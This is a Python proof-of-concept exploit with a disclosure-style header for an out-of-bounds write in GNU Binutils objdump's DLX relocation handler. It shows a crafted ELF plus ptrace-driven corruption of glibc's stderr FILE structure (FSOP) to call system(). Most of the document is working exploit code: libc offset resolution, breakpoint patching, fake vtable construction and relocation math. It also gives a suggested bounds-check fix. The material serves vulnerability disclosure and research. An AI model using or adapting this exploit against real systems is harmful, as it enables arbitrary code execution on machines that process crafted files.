"""
Proof-of-Concept: Out-of-Bounds Write → FSOP → Arbitrary Code Execution
                  in GNU Binutils objdump (bfd/elf32-dlx.c)

Vendor:       GNU
Product:      GNU Binutils (all versions through current HEAD)
Component:    bfd/elf32-dlx.c — elf32_dlx_relocate26()
Type:         CWE-787 (Out-of-bounds Write)
Impact:       Arbitrary code execution
Attack vector: Local — crafted ELF file processed by `objdump -g`
Tested on:    Debian 13 (Trixie), glibc 2.41, x86_64, kernel 6.x
Requirements: Python 3.10+, no external dependencies

VULNERABILITY
-------------
The DLX relocation handler elf32_dlx_relocate26() in bfd/elf32-dlx.c
performs a 4-byte read/write at data + reloc_entry->address without
bounds checking against the target section size. The offset comes
directly from the ELF file and can point arbitrarily beyond the
section buffer.

The function returns bfd_reloc_ok, which causes the generic bounds
check in bfd/reloc.c (line ~718) to be skipped entirely.

Vulnerable code (bfd/elf32-dlx.c):

    insn = bfd_get_32(abfd, data + reloc_entry->address);  // OOB read
    // ... relocation math ...
    bfd_put_32(abfd, insn, data + reloc_entry->address);   // OOB write
    return bfd_reloc_ok;                                    // skips bounds check

EXPLOITATION
------------
When the .debug_info section is >= 128 KB, malloc uses mmap() for the
buffer. On x86_64 Linux, this places the buffer in the same mmap region
as libc's data segment. The distance between the buffer and libc's
_IO_2_1_stderr_ is deterministic (0x21A4D0 on tested configuration),
even with ASLR enabled.

The exploit uses 4 OOB R_DLX_RELOC_26_PCREL relocations to corrupt
_IO_2_1_stderr_ fields (FSOP — File Stream Oriented Programming):

  1. _flags      ← command bytes ("ps\\0") — becomes system() argument
  2. _IO_write_ptr ← non-zero — triggers flush via _IO_wfile_overflow
  3. _wide_data  ← pointer to fake _IO_wide_data in the section buffer
  4. vtable      ← _IO_wfile_jumps — enters the wide file code path

The fake _IO_wide_data's _wide_vtable points to a fake jump table whose
__doallocate slot contains system(). When objdump writes to stderr,
the corrupted vtable chain calls system(stderr), which executes the
command embedded in _flags.

Execution path:
  objdump writes to stderr
  → _IO_wfile_overflow(stderr)
    → _IO_wdoallocbuf(stderr)
      → _IO_WDOALLOCATE(stderr)
        = stderr->_wide_data->_wide_vtable->__doallocate(stderr)
        = system(stderr)
        = system("ps")

This PoC uses ptrace to intercept elf32_dlx_relocate26() at runtime,
resolve ASLR-dependent addresses, and patch relocation symbol values
on the fly. No GDB or external tools are required.

REPRODUCTION
------------
1. Build binutils with DLX support:
     cd binutils-gdb && mkdir build && cd build
     ../configure --target=dlx-elf --disable-nls --disable-werror
     make -j$(nproc)

2. Generate the ELF payload:
     python3 poc_generate.py -o exploit.bin

3. Run this PoC (requires Linux x86_64, ptrace permissions):
     python3 poc_ptrace.py            # executes "ps" via system()
     python3 poc_ptrace.py --cmd ps   # same, explicit

   Expected output:
     [*] libc_base = 0x00XXXXXXXXXXXX
     [*] stderr    = 0x00XXXXXXXXXXXX
     [*] system    = 0x00XXXXXXXXXXXX
     [*] reloc0 sym->value ← ...  (cmd low26=0x707300)
     ...
       PID TTY          TIME CMD       ← command executed via system()
     [+] done

SUGGESTED FIX
-------------
Add a bounds check before accessing data + reloc_entry->address:

    if (reloc_entry->address + 4 > input_section->size)
        return bfd_reloc_outofrange;

CONSTRAINTS ON COMMAND
----------------------
The FSOP technique writes only 3 bytes into _flags. The command must
be exactly 2 ASCII characters (byte[2] = \\0 = null terminator for
system()). Additionally, the bytes must satisfy glibc's FILE flag
constraints:

    cmd[0] & 0x02 == 0   (_IO_UNBUFFERED must not be set)
    cmd[0] & 0x08 == 0   (_IO_NO_WRITES must not be set)
    cmd[1] & 0x20 != 0   (_IO_IS_FILEBUF must be set)

Valid: "ps" (0x70, 0x73)  —  Invalid: "ls" (0x6C has bit 3 set)

DISCLAIMER
----------
This PoC is provided for authorized security research and responsible
disclosure purposes only. Do not use this against systems you do not
own or have explicit permission to test.
"""

import argparse
import ctypes
import ctypes.util
import os
import signal
import struct
import subprocess
import sys
from pathlib import Path

# Configuration
# Adjust these paths to match your binutils build location.

OBJDUMP_BIN = "./binutils-gdb/build/binutils/objdump"
EXPLOIT_BIN = "./exploit.bin"

# Exploit constants

DEBUG_SIZE      = 0x30000       # 192 KB section size (triggers mmap allocation)
FAKE_WDATA_OFF  = 0x1000        # offset in section buffer: fake _IO_wide_data
FAKE_VTABLE_OFF = 0x2000        # offset in section buffer: fake _IO_jump_t
OFF_WIDE_VTABLE = 0xE0          # _IO_wide_data._wide_vtable field offset
OFF_DOALLOCATE  = 0x68          # _IO_jump_t.__doallocate slot offset

MASK26                = 0x03FFFFFF
EXPECTED_DELTA_STDERR = 0x21A4D0    # constant distance: section buffer → stderr

# Offset of elf32_dlx_relocate26 in objdump PIE binary.
# Obtain with: nm objdump | grep elf32_dlx_relocate26
# Must be recalibrated if objdump is recompiled.
ELF32_DLX_RELOC26_OFF = 0xAD5D90

# libc symbol offsets (relative to libc base, obtained via: nm -D libc.so.6).
# These are specific to glibc 2.41 on Debian 13 x86_64.
LIBC_SYMS = {
    "_IO_2_1_stderr_": 0x1E64E0,
    "_IO_wfile_jumps": 0x1E4228,
    "system":          0x53110,
}


# Address resolution via /proc/PID/maps

def resolve_libc_base(pid: int, libc_name: str) -> int:
    """Read /proc/PID/maps to find the base address of libc."""
    maps = Path(f"/proc/{pid}/maps").read_text()
    addrs = [
        int(line.split("-")[0], 16)
        for line in maps.splitlines()
        if libc_name in line
    ]
    if not addrs:
        raise RuntimeError(f"{libc_name} not found in /proc/{pid}/maps")
    return min(addrs)


def resolve_objdump_base(pid: int) -> int:
    """Read /proc/PID/maps to find the base address of objdump."""
    maps = Path(f"/proc/{pid}/maps").read_text()
    name = Path(OBJDUMP_BIN).name
    for line in maps.splitlines():
        if name in line or OBJDUMP_BIN in line:
            return int(line.split("-")[0], 16)
    raise RuntimeError(f"{OBJDUMP_BIN} not found in /proc/{pid}/maps")


def resolve_libc_name() -> str:
    """Use ldd to find the libc library name used by objdump."""
    result = subprocess.run(
        ["ldd", OBJDUMP_BIN], capture_output=True, text=True
    )
    for line in result.stdout.splitlines():
        if "libc.so" in line and "=>" in line:
            libc_path = line.split("=>")[1].split("(")[0].strip()
            print(f"[*] libc: {libc_path}")
            return Path(libc_path).name
    sys.exit("[!] Could not determine libc path via ldd")


# ptrace interface (via ctypes, no external dependencies)

_libc = ctypes.CDLL(None)

_waitpid_fn = _libc.waitpid
_waitpid_fn.restype = ctypes.c_int
_waitpid_fn.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int), ctypes.c_int]

PTRACE_TRACEME    = 0
PTRACE_PEEKDATA   = 2
PTRACE_POKEDATA   = 5
PTRACE_CONT       = 7
PTRACE_SINGLESTEP = 9
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13

_ptrace_fn = _libc.ptrace
_ptrace_fn.restype = ctypes.c_long


def ptrace(request, pid=0, addr=0, data=0):
    """Thin wrapper around the ptrace(2) syscall."""
    return _ptrace_fn(
        ctypes.c_long(request),
        ctypes.c_long(pid),
        ctypes.c_void_p(addr),
        ctypes.c_void_p(data),
    )


def peek(pid: int, addr: int) -> int:
    """Read 8 bytes from the child process memory (PTRACE_PEEKDATA)."""
    val = ptrace(PTRACE_PEEKDATA, pid, addr)
    return ctypes.c_ulong(val).value


def poke(pid: int, addr: int, value: int):
    """Write 8 bytes to the child process memory (PTRACE_POKEDATA)."""
    ptrace(PTRACE_POKEDATA, pid, addr, value & 0xFFFFFFFFFFFFFFFF)


def read_be32(pid: int, addr: int) -> int:
    """Read a big-endian 32-bit value from the child process memory."""
    raw = peek(pid, addr)
    b = raw.to_bytes(8, "little")
    return struct.unpack(">I", b[:4])[0]


def waitpid(pid: int) -> int:
    """Wait for a state change in the child process."""
    status = ctypes.c_int(0)
    _waitpid_fn(pid, ctypes.byref(status), 0)
    return status.value


def wstopsig(status: int) -> int:
    """Extract the stop signal number from a waitpid status."""
    return (status & 0xFF00) >> 8


# x86_64 user_regs_struct layout (from <asm/user_64.h>)
class UserRegs(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulong), ("r14", ctypes.c_ulong),
        ("r13", ctypes.c_ulong), ("r12", ctypes.c_ulong),
        ("rbp", ctypes.c_ulong), ("rbx", ctypes.c_ulong),
        ("r11", ctypes.c_ulong), ("r10", ctypes.c_ulong),
        ("r9",  ctypes.c_ulong), ("r8",  ctypes.c_ulong),
        ("rax", ctypes.c_ulong), ("rcx", ctypes.c_ulong),
        ("rdx", ctypes.c_ulong), ("rsi", ctypes.c_ulong),
        ("rdi", ctypes.c_ulong), ("orig_rax", ctypes.c_ulong),
        ("rip", ctypes.c_ulong), ("cs",  ctypes.c_ulong),
        ("eflags", ctypes.c_ulong), ("rsp", ctypes.c_ulong),
        ("ss",  ctypes.c_ulong), ("fs_base", ctypes.c_ulong),
        ("gs_base", ctypes.c_ulong), ("ds", ctypes.c_ulong),
        ("es",  ctypes.c_ulong), ("fs",  ctypes.c_ulong),
        ("gs",  ctypes.c_ulong),
    ]


def getregs(pid: int) -> UserRegs:
    """Read all general-purpose registers from the child process."""
    regs = UserRegs()
    ptrace(PTRACE_GETREGS, pid, 0, ctypes.addressof(regs))
    return regs


def setregs(pid: int, regs: UserRegs):
    """Write all general-purpose registers to the child process."""
    ptrace(PTRACE_SETREGS, pid, 0, ctypes.addressof(regs))


# PCREL26 relocation math

def compute_sym_value(desired_low26: int, cur_be32: int) -> int:
    """
    Compute the symbol value needed so that the PCREL26 relocation
    writes the desired 26-bit value over the current BE32 word.

    This is the inverse of the relocation formula in elf32_dlx_relocate26():
        vallo = insn & 0x03FFFFFF  (sign-extended if bit 25 set)
        val   = sym->value - vallo
        insn  = (insn & 0xFC000000) | (val & 0x03FFFFFF)
    """
    vallo = cur_be32 & MASK26
    if vallo & 0x03000000:
        vallo = (~(vallo | 0xFC000000) + 1) & 0xFFFFFFFF
    val = (desired_low26 - 0x04000000) if (desired_low26 & 0x02000000) else desired_low26
    return (val + vallo) & 0xFFFFFFFF


# Command validation

def validate_command(cmd: str) -> int:
    """
    Validate that the command satisfies FSOP constraints and return
    the 26-bit value to write into _flags.

    The technique writes exactly 3 bytes into _flags:
      byte[0] = cmd[0], byte[1] = cmd[1], byte[2] = 0x00 (null terminator)

    Constraints from glibc's FILE flag layout:
      cmd[0] & 0x02 == 0  → _IO_UNBUFFERED must not be set
      cmd[0] & 0x08 == 0  → _IO_NO_WRITES must not be set
      cmd[1] & 0x20 != 0  → _IO_IS_FILEBUF must be set
    """
    if len(cmd) != 2:
        sys.exit(f"[!] Command must be exactly 2 characters (3-byte write constraint)")

    b = (cmd + "\x00").encode()[:3]

    if b[0] & 0x0A:
        sys.exit(
            f"[!] cmd[0]='{chr(b[0])}' ({b[0]:#04x}) violates "
            f"_IO_UNBUFFERED/_IO_NO_WRITES (bit 1 or 3 set)"
        )
    if not (b[1] & 0x20):
        sys.exit(
            f"[!] cmd[1]='{chr(b[1])}' ({b[1]:#04x}): "
            f"_IO_IS_FILEBUF (bit 5) not set"
        )

    cmd_low26 = (b[0] << 16) | (b[1] << 8) | b[2]
    print(f"[*] cmd = {cmd!r}  low26 = {cmd_low26:#08x}")
    return cmd_low26


# Main exploit logic

def exploit(cmd: str = "ps"):
    """
    Spawn objdump under ptrace, intercept elf32_dlx_relocate26() calls,
    and patch OOB relocations to corrupt stderr for FSOP → system().
    """
    # Verify prerequisites
    if not Path(EXPLOIT_BIN).exists():
        sys.exit(f"[!] {EXPLOIT_BIN} not found — run: python3 poc_generate.py")
    if not Path(OBJDUMP_BIN).exists():
        sys.exit(f"[!] {OBJDUMP_BIN} not found — build binutils with DLX target")

    libc_name = resolve_libc_name()
    cmd_low26 = validate_command(cmd)

    # Fork and exec objdump under ptrace
    pid = os.fork()
    if pid == 0:
        # Child: request tracing, redirect stderr, exec objdump
        try:
            ptrace(PTRACE_TRACEME)
            devnull = os.open("/dev/null", os.O_WRONLY)
            os.dup2(devnull, 2)
            os.execv(OBJDUMP_BIN, [OBJDUMP_BIN, "-g", EXPLOIT_BIN])
        except Exception:
            pass
        os._exit(1)

    # Parent: trace the child
    # Wait for initial SIGTRAP after execve.
    # At this point, ld.so has NOT run yet: only objdump is mapped.
    status = waitpid(pid)
    if not os.WIFSTOPPED(status):
        sys.exit(f"[!] Expected stop after exec, got status={status:#x}")

    # Resolve objdump base address (available immediately after exec)
    objdump_base = resolve_objdump_base(pid)
    fn_addr = objdump_base + ELF32_DLX_RELOC26_OFF
    print(f"[*] objdump_base = {objdump_base:#016x}")
    print(f"[*] fn_addr      = {fn_addr:#016x}  (elf32_dlx_relocate26)")

    # Set INT3 breakpoint at elf32_dlx_relocate26 entry
    orig_word = peek(pid, fn_addr)
    bp_word = (orig_word & ~0xFF) | 0xCC
    poke(pid, fn_addr, bp_word)

    # Let ld.so run and load libc + the application
    ptrace(PTRACE_CONT, pid, 0, 0)

    # State variables (resolved on first OOB hit, after ld.so has loaded libc)
    libc_base = None
    stderr_addr = None
    system_addr = None
    wfile_addr = None
    patched_structs = False

    # Breakpoint loop
    while True:
        status = waitpid(pid)

        if os.WIFEXITED(status):
            print(f"[*] Child exited (code {os.WEXITSTATUS(status)})")
            break
        if os.WIFSIGNALED(status):
            print(f"[*] Child killed by signal {os.WTERMSIG(status)}")
            break
        if not os.WIFSTOPPED(status):
            ptrace(PTRACE_CONT, pid, 0, 0)
            continue

        sig = wstopsig(status)
        if sig != signal.SIGTRAP:
            # Non-SIGTRAP signal (e.g., SIGCHLD after system() completes)
            print(f"[*] Signal {sig} received — forwarding and exiting")
            ptrace(PTRACE_CONT, pid, 0, sig)
            break

        regs = getregs(pid)

        # Verify this is our INT3 breakpoint (RIP points past the 0xCC byte)
        if regs.rip != fn_addr + 1:
            ptrace(PTRACE_CONT, pid, 0, 0)
            continue

        # Restore original instruction
        poke(pid, fn_addr, orig_word)

        # Read elf32_dlx_relocate26() arguments from registers:
        #   RDI = abfd
        #   RSI = reloc_entry (arelent*)
        #   RDX = symbol      (asymbol*)
        #   RCX = data         (section buffer pointer)
        data_addr = regs.rcx
        reloc_entry_ptr = regs.rsi
        sym_ptr = regs.rdx          # asymbol* — value field at offset +0x10

        # Read reloc_entry->address (offset 8 in arelent struct)
        reloc_off = peek(pid, reloc_entry_ptr + 8) & 0xFFFFFFFF

        if reloc_off < DEBUG_SIZE:
            # In-bounds relocation — let it execute normally
            regs.rip = fn_addr
            setregs(pid, regs)
            ptrace(PTRACE_SINGLESTEP, pid, 0, 0)
            waitpid(pid)
            poke(pid, fn_addr, bp_word)     # re-arm breakpoint
            ptrace(PTRACE_CONT, pid, 0, 0)
            continue

        # OOB relocation detected

        # Resolve libc addresses on first OOB hit (ld.so has loaded libc by now)
        if libc_base is None:
            libc_base = resolve_libc_base(pid, libc_name)
            stderr_addr = libc_base + LIBC_SYMS["_IO_2_1_stderr_"]
            system_addr = libc_base + LIBC_SYMS["system"]
            wfile_addr = libc_base + LIBC_SYMS["_IO_wfile_jumps"]
            print(f"[*] libc_base = {libc_base:#016x}")
            print(f"[*] stderr    = {stderr_addr:#016x}")
            print(f"[*] system    = {system_addr:#016x}")

        # Compute actual delta between section buffer and stderr.
        # May differ from EXPECTED_DELTA_STDERR if ptrace causes
        # additional mappings that shift the mmap layout.
        actual_delta = (stderr_addr - data_addr) & 0xFFFFFFFF

        # Write fake FSOP structures into the section buffer (once)
        if not patched_structs:
            patched_structs = True
            fake_wdata = data_addr + FAKE_WDATA_OFF
            fake_vtable = data_addr + FAKE_VTABLE_OFF

            # fake_wdata._wide_vtable → fake_vtable
            poke(pid, fake_wdata + OFF_WIDE_VTABLE, fake_vtable)
            # fake_vtable.__doallocate → system()
            poke(pid, fake_vtable + OFF_DOALLOCATE, system_addr)

            print(f"\n[*] actual delta = {actual_delta:#x}  (expected {EXPECTED_DELTA_STDERR:#x})")
            print(f"[*] fake_wdata._wide_vtable  <- {fake_vtable:#x}")
            print(f"[*] fake_vtable.__doallocate <- {system_addr:#x}")

        # Adjust relocation offset if actual delta differs from expected.
        # exploit.bin was built with EXPECTED_DELTA_STDERR; we patch
        # reloc_entry->address on-the-fly to match the real layout.
        field_signed = (reloc_off - EXPECTED_DELTA_STDERR) & 0xFFFFFFFF
        actual_off = (actual_delta + field_signed) & 0xFFFFFFFF

        if actual_off != reloc_off:
            poke(pid, reloc_entry_ptr + 8, actual_off)

        print(f"[*] OOB off={reloc_off:#010x}->{actual_off:#010x}  data={data_addr:#x}")

        # Compute actual target offsets for each corrupted stderr field
        actual_OFF_R0 = (actual_delta - 1) & 0xFFFFFFFF       # _flags
        actual_OFF_R2 = (actual_delta + 0x9F) & 0xFFFFFFFF    # _wide_data[0:3]
        actual_OFF_R3 = (actual_delta + 0xD7) & 0xFFFFFFFF    # vtable[0:3]

        cur_be32 = read_be32(pid, data_addr + actual_off)

        # Patch sym->value for each OOB relocation to write the correct value
        if actual_off == actual_OFF_R0:
            # Reloc 0: write command bytes into _flags
            sv = compute_sym_value(cmd_low26, cur_be32)
            poke(pid, sym_ptr + 0x10, sv)
            print(f"[*] reloc0 sym->value <- {sv:#010x}  (cmd low26={cmd_low26:#08x})")

        elif actual_off == actual_OFF_R2:
            # Reloc 2: _wide_data -> fake_wdata (3 low bytes of address)
            fake_wdata = data_addr + FAKE_WDATA_OFF
            wd = fake_wdata.to_bytes(8, "little")
            desired = ((wd[0] << 16) | (wd[1] << 8) | wd[2]) & MASK26
            sv = compute_sym_value(desired, cur_be32)
            poke(pid, sym_ptr + 0x10, sv)
            print(f"[*] reloc2 sym->value <- {sv:#010x}  (fake_wdata={fake_wdata:#x})")

        elif actual_off == actual_OFF_R3:
            # Reloc 3: vtable -> _IO_wfile_jumps (3 low bytes of address)
            wb = wfile_addr.to_bytes(8, "little")
            desired = ((wb[0] << 16) | (wb[1] << 8) | wb[2]) & MASK26
            sv = compute_sym_value(desired, cur_be32)
            poke(pid, sym_ptr + 0x10, sv)
            print(f"[*] reloc3 sym->value <- {sv:#010x}  (wfile={wfile_addr:#x})")

        # Single-step past the original instruction, re-arm breakpoint, continue
        regs.rip = fn_addr
        setregs(pid, regs)
        ptrace(PTRACE_SINGLESTEP, pid, 0, 0)
        waitpid(pid)
        poke(pid, fn_addr, bp_word)
        ptrace(PTRACE_CONT, pid, 0, 0)

    # Reap child process
    try:
        os.waitpid(pid, os.WNOHANG)
    except ChildProcessError:
        pass

    print("[+] Done")


# Entry point

def main():
    parser = argparse.ArgumentParser(
        description="PoC: GNU Binutils objdump DLX OOB Write -> FSOP -> ACE (ptrace, no GDB)",
        epilog="Example: python3 %(prog)s --cmd ps",
    )
    parser.add_argument(
        "--cmd", default="ps",
        help=(
            "Command to execute (exactly 2 chars). "
            "Must satisfy: cmd[0] & 0x0A == 0, cmd[1] & 0x20 != 0. "
            "Default: 'ps'"
        ),
    )
    args = parser.parse_args()
    exploit(args.cmd)


if __name__ == "__main__":
    main()
